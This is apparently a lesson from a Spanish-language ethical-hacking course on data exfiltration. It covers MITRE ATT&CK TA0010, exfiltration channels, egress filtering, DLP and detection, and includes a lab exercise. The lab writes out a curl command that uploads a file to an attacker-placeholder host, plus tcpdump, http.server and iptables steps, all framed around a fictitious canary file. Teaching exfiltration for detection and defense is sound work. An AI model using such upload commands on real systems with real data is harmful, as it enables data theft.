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083 — Exfiltración de datos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fase de exfiltración dentro del ciclo de un ataque: cómo se demuestra de forma controlada el impacto real de un compromiso (probar que "los datos podían salir") y, con la misma profundidad, qué señales deja y cómo un equipo defensivo (DLP, NSM, egress filtering) la detecta y la bloquea. El objetivo del pentester ético no es robar datos, sino probar el riesgo y ayudar a cerrarlo.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la exfiltración en la kill chain y en MITRE ATT&amp;CK (TA0010) y distinguirla de la simple recolección (collection).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canales de exfiltración comunes (HTTPS, DNS, ICMP, servicios cloud legítimos) y por qué unos son más sigilosos que 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de forma controlada, en laboratorio, una transferencia mínima con un archivo canario (nunca datos reales/sensibles).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defensivos: egress filtering, inspección TLS, DLP, límites de volumen y detección de tunneling.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hallazgo en el informe con impacto de negocio y recomendaciones priorizadas.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Exfiltración vs collection vs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Canales: HTTP(S), DNS, ICMP, email,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Exfiltración "over C2" vs canal alternativo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Ofuscación: cifrado, encoding, chunking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Límites de tasa y "low and slow"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Detección: egress filtering y DLP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Uso de un archivo canario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Exfiltración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 en la que un actor transfiere datos fuera de la red objetivo. Característica clave: en un pentest ético se demuestra con datos ficticios/canario, nunca con información real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Egress filtering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que restringe el tráfico saliente a solo lo estrictamente necesario (puertos, destinos, protocolos). Es la contramedida más eficaz: si el tráfico no puede salir, no hay exfiltración.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DLP (Data Loss Prevention)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tecnologías que inspeccionan datos en movimiento/reposo/uso para bloquear la salida de información sensible según políticas (patrones de tarjetas, PII, clasificación).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aislado (dos VMs: "atacante" y "víctima" bajo tu control, ambas tuyas). Herramientas de estudio: tcpdump/Wireshark para observar el canal, un servidor HTTP propio para el destino, y utilidades de red estándar. Del lado defensivo: reglas de egress en el firewall del lab (iptables/pfSense), y opcionalmente Zeek para ver los logs de DNS/HTTP. Nunca uses datos reales; genera un archivo canario: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"CANARIO-PENTEST-$(date +%s) — dato ficticio de laboratorio" &gt; /tmp/canario.txt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el destino (tu VM atacante). Levanta un receptor HTTP simple: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python3 -m http.server 8000    # escucha en tu VM de laboratorio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canal. En la VM víctima, arranca la captura para ver exactamente qué viaja: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tcpdump -i eth0 -w /tmp/exfil-lab.pcap host &lt;IPatacante&gt;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Transferir el canario (demostración de impacto). Sube el archivo ficticio por HTTP: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curl -F "f=@/tmp/canario.txt" http://&lt;IPatacante&gt;:8000/upload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como defensor. Abre exfil-lab.pcap en Wireshark: identifica el tamaño, el destino, el protocolo y el patrón temporal. Anota qué firma detectaría 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MITRE ATT&amp;CK: ¿T1041 (over C2) o T1048 (alternative protocol)? Justifica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DNS e ICMP son canales atractivos para un atacante y qué control los neutraliza.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(pseudo-Sigma) para "consulta DNS con subdominio &gt; 50 caracteres y alta entropía".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cuánto tardaría una exfiltración "low and slow" de 1 GB a 1 KB cada 5 min, y por qué esa lentitud evade umbrales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política de egress filtering mínima para un servidor que solo debe hablar con un repositorio interno.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canal HTTP del laboratorio, captura el tráfico, luego aplica egress filtering y demuestra que la transferencia del canario ahora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.pcap con la transferencia inicial identificada, (b) la regla de egress aplicada, y (c) una captura/log que evidencia el bloqueo posterior. Todo con el archivo canario ficticio; cero datos reales.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datos reales del cliente para "demostrar" — Nunca. Usa siempre un archivo canario ficticio. La demostración de que el canal existe es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firewall del lab no bloquea nada tras -P OUTPUT DROP — Faltan reglas de estado; añade -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT con cuidado, o revisa el orden de las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 "no se ve" en los logs — No estás registrando consultas DNS; habilita el dns.log de Zeek o el logging del resolvedor.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C2 con exfiltración en el informe — El C2 es el canal de control; la exfiltración es la salida de datos. Sepáralos en la narrativa.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TLS = indetectable — El metadato (destino, volumen, JA3, timing) sigue siendo visible aunque el contenido esté cifrado.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exfiltrar datos reales para probar el riesgo al cliente?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Basta con demostrar que el canal funciona usando un archivo canario. Extraer datos reales añade riesgo legal y de exposición sin aportar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defensa número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egress filtering: por defecto denegar todo el tráfico saliente y permitir solo lo imprescindible. Complementado con DLP y monitoreo de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estudia esto en un curso defensivo?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puedes detectar ni bloquear lo que no entiendes. Conocer los canales y sus huellas es lo que permite escribir buenas detecciones.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Exfiltration (TA0010)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T1048 Exfiltration Over Alternative Protocol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— Penetration Testing: A Hands-On Introduction to Hacking.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lecturas sobre DNS tunneling detection y egress filtering.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